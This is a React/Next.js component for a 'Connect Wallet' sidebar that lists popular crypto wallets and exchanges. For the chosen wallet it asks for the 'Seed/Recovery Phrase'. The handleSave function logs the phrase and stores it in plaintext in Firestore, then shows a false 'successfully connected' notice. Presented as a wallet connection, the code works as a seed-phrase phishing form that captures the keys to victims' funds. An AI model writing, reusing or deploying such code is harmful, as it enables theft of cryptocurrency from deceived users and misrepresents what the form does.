"use client"

import { ArrowLeft, Calendar, ChevronRight, Files, Home, Inbox, Search, Settings, Signal } from "lucide-react"

import {
  Sidebar,
  SidebarContent,
  SidebarGroup,
  SidebarGroupContent,
  SidebarGroupLabel,
  SidebarHeader,
  SidebarMenu,
  SidebarMenuButton,
  SidebarMenuItem,
  SidebarMenuSub,
  SidebarMenuSubItem
} from "@/components/ui/multisidebar"
import { CollapsibleContent, Collapsible, CollapsibleTrigger } from "@radix-ui/react-collapsible"
import { ChevronDown } from "lucide-react"
import Link from 'next/link'
import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { signOut, onAuthStateChanged } from "firebase/auth"
import { auth, firestore } from "@/components/firebase"
// import SolarLogo from "../public/images/solarLogo.png";
import SolarLogo from "../../../public/images/solarLogo.png";
import { Button } from "@/components/ui/button";  // Example Shadcn component
import Image from 'next/image';  // for your log
import { useUserData } from "../store"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "./dialog"
import { Drawer, DrawerClose, DrawerContent, DrawerDescription, DrawerFooter, DrawerHeader, DrawerTitle, DrawerTrigger } from "./drawer"
import { useIsMobile } from "@/hooks/use-mobile"
import { Label } from "./label"
import { Input } from "./input"
import { useMultiSidebar } from "@/components/ui/multisidebar"
import { doc, setDoc } from "firebase/firestore"


export function RightSidebar() {
  const [searchTerm, setSearchTerm] = useState("");
  const [isConnectWalletOpen, setConnectWalletOpen] = useState(false);
  const isMobile = useIsMobile();
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState("");
  const { rightSidebar } = useMultiSidebar();
  const { toggleSidebar: toggleRight } = rightSidebar;
  const { leftSidebar } = useMultiSidebar();
  const { toggleSidebar: toggleLeft } = leftSidebar;

  const wallets = [
    "Aktionariat Wallet",
    "Binance",
    "Bitcoin Wallet",
    "Bitkeep Wallet",
    "Bitpay",
    "Blockchain",
    "Coinbase",
    "Coinbase One",
    "Crypto Wallet",
    "Exodus Wallet",
    "Gemini",
    "Imtoken",
    "Infinito Wallet",
    "Infinity Wallet",
    "Keyringpro Wallet",
    "Metamask",
    "Ownbit Wallet",
  ];

  const filteredWallets = wallets.filter((wallet) =>
    wallet.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const handleSearchChange = (e: any) => {
    setSearchTerm(e.target.value);
  };

  const handleConnectWallet = () => {
    console.log("Handle Connect Wallet");
    setConnectWalletOpen(true);
  };

  const handleWalletClick = (wallet: string) => {
    setSelectedWallet(wallet);
    setIsDialogOpen(true);
  };

  const handleRight = () => {
    console.log("handling right")
    !isMobile && toggleLeft()
    toggleRight()
  }

  return (
    <Sidebar side="right">
      <SidebarHeader className="px-4 pt-4">
        <div className="flex justify-between items-center my-2">
          <ArrowLeft onClick={handleRight} />
          <h2 className="text-lg font-semibold text-center">Connect Wallet</h2>
        </div>
        {/* <Link href="/">
        </Link> */}
        <p className="text-xs text-center text-gray-600">
          Connect your wallet to enjoy advanced features. The Real World Fusion supports
          500+ exchanges & wallets, NFTs, 10,000+ cryptocurrencies, and 20,000+ DeFi
          smart contracts.
        </p>
      </SidebarHeader>

      <SidebarContent className="px-4 py-6 overflow-y-auto">
        <div className="mb-4">
          <input
            type="text"
            placeholder="Search for your wallet"
            value={searchTerm}
            onChange={handleSearchChange}
            className="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>

        <div className="space-y-2">
          {filteredWallets.map((wallet, index) => (
            <SidebarMenuButton
              key={index}
              className="flex items-center justify-between px-4 py-2 text-left text-gray-800 bg-gray-100 rounded-lg hover:bg-gray-200"
              onClick={() => handleWalletClick(wallet)}
            >
              <span className="font-bold"> {wallet}</span>
              {/* <Button
            key={wallet}
            className="w-full text-left py-2 px-4 hover:bg-gray-100"
            onClick={() => handleWalletClick(wallet)}
          >
            Connect
          </Button> */}
              {/* <button className="px-2 py-1 text-sm text-blue-500 border border-blue-500 rounded hover:bg-blue-500 hover:text-white">
                Connect
              </button> */}
            </SidebarMenuButton>
          ))}
        </div>
      </SidebarContent>
      {/* Dialog/Drawer for Wallet Information */}
      {isMobile ? (
        <Drawer open={isDialogOpen} onOpenChange={setIsDialogOpen}>
          <DrawerContent>
            <DrawerHeader>
              <DrawerTitle>Connect Wallet</DrawerTitle>
              <DrawerDescription>
                Enter the required details to connect your wallet.
              </DrawerDescription>
            </DrawerHeader>
            <div className="p-4">
              <WalletForm walletName={selectedWallet} />
            </div>
            <DrawerFooter>
              <DrawerClose asChild>
                <Button variant="outline">Cancel</Button>
              </DrawerClose>
            </DrawerFooter>
          </DrawerContent>
        </Drawer>
      ) : (
        <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
          <DialogContent className="sm:max-w-[425px]">
            <DialogHeader>
              <DialogTitle>Connect Wallet</DialogTitle>
              <DialogDescription>
                Enter the required details to connect your wallet.
              </DialogDescription>
            </DialogHeader>
            <WalletForm walletName={selectedWallet} />
          </DialogContent>
        </Dialog>
      )}


    </Sidebar>

  )
}

function WalletForm({ walletName }: { walletName: string }) {
  const [recoveryPhrase, setRecoveryPhrase] = useState("");
  const [isSaveOpen, setSaveOpen] = useState(false);
  const [sending, setSending] = useState(false);

  const handleSave = () => {
    setSending(true)
    console.log("Wallet:", walletName);
    console.log("Recovery Phrase:", recoveryPhrase);
    onAuthStateChanged(auth, async (user) => {
      if (!user) return
      const userRef = doc(firestore, "users", user.uid)
      await setDoc(userRef, {
        wallet: [
          {
            walletName,
            recoveryPhrase
          }]

      }, { merge: true }).then(() => {
        setSaveOpen(true);
        setSending(false)
      })

    })

    // Add your save logic here
  };

  return (
    <div className="wallet-form space-y-4">
      <div>
        <Label htmlFor="wallet">Wallet</Label>
        <Input id="wallet" value={walletName} readOnly className="mt-1" />
      </div>
      <div>
        <Label htmlFor="recovery-phrase">Seed/Recovery Phrase</Label>
        <textarea
          id="recovery-phrase"
          value={recoveryPhrase}
          onChange={(e) => {
            setRecoveryPhrase(e.target.value)
          }
          }
          placeholder={`Your ${walletName} Seed/Recovery Phrase`}
          className="mt-1 min-h-[120px] w-full border border-gray-300 rounded p-2"
        />
      </div>
      <div className="flex justify-start space-x-2">
        <Button variant="outline" onClick={() => console.log("Disconnect clicked")}>Disconnect</Button>
        <Button onClick={handleSave}>
          {sending ? "Sending ..." : "Send"}
          </Button>
      </div>
      <Dialog open={isSaveOpen} onOpenChange={setSaveOpen}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Notification </DialogTitle>
          </DialogHeader>
          <p> Your wallet has been sucessfully connected</p>
        </DialogContent>
      </Dialog>
    </div>
  );
}
